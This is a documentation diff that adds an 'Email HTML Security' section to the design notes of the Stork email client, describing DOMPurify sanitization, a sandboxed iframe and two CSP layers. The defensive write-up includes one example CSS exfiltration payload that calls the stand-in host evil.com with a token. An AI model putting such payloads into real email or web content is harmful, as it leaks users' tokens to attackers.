@@ -252,6 +252,54 @@ The container:
 
 Data persistence is handled by a Docker volume (named volume with `docker compose`, or a bind mount path with direct `docker run`).
 
+## Email HTML Security
+
+HTML emails are untrusted content that could contain scripts, tracking pixels, or data-exfiltration attempts. Stork uses a defense-in-depth strategy with four layers:
+
+### Layer 1: HTML Sanitization (DOMPurify)
+
+`email-sanitizer.ts` runs DOMPurify with a strict configuration:
+- **Forbidden tags**: `script`, `iframe`, `object`, `embed`, `form`, `meta`, `link`, `style`
+- **Event handler stripping**: All `on*` attributes removed post-sanitization
+- **CSS `url()` neutralization**: Inline style `url()` references are blanked to prevent CSS-based data exfiltration (e.g. `background-image: url('https://evil.com/track?token=...')`)
+- **Link enforcement**: All anchors forced to `target="_blank"` with `rel="noopener noreferrer"`
+- **Tracking pixel detection**: 1×1/0×0 images and known tracking URL patterns removed
+- **Remote image blocking**: Off by default; user can opt in per-message
+
+### Layer 2: Sandboxed Iframe Rendering
+
+Email HTML is rendered inside an `<iframe sandbox="allow-same-origin allow-popups">`:
+- **No `allow-scripts`** — the browser refuses to execute ANY JavaScript inside the frame, even if the sanitizer misses a `<script>` tag or event handler. This is the strongest guarantee.
+- `allow-same-origin` is safe without `allow-scripts` — it only lets the parent read `contentDocument` to auto-size the iframe height.
+- `allow-popups` lets sanitized `<a target="_blank">` links open in new tabs.
+
+### Layer 3: Iframe-level CSP
+
+The sandboxed iframe's `srcdoc` includes its own `<meta>` CSP:
+```
+default-src 'none'; style-src 'unsafe-inline'; img-src data: cid:;
+```
+This blocks all script execution, network requests, and external resource loading from within the email frame itself.
+
+### Layer 4: Server-level CSP Headers
+
+The Hono server sets `Content-Security-Policy` headers on HTML responses:
+```
+default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
+img-src 'self' data: cid: https:; object-src 'none'; base-uri 'self'
+```
+This prevents inline script injection in the parent document and restricts resource loading.
+
+### Why this is sufficient
+
+For a script in an HTML email to access the parent DOM and leak private information, it would need to bypass ALL of:
+1. DOMPurify tag/attribute stripping
+2. The iframe `sandbox` attribute (browser-enforced, not bypassable via HTML/JS)
+3. The iframe-level CSP blocking script execution
+4. The server-level CSP blocking inline scripts
+
+The sandbox attribute alone is sufficient — it is enforced by the browser's security model, not by HTML parsing. Even a novel DOMPurify bypass cannot execute scripts inside a `sandbox` iframe without `allow-scripts`.
+
 ## Design Principles
 
 1. **Self-host the client, not the edge.** Don't compete with mail servers — complement them. Let Postfix/Dovecot/Fastmail handle MX records, DKIM, and deliverability. Stork handles storage, search, and the UI.
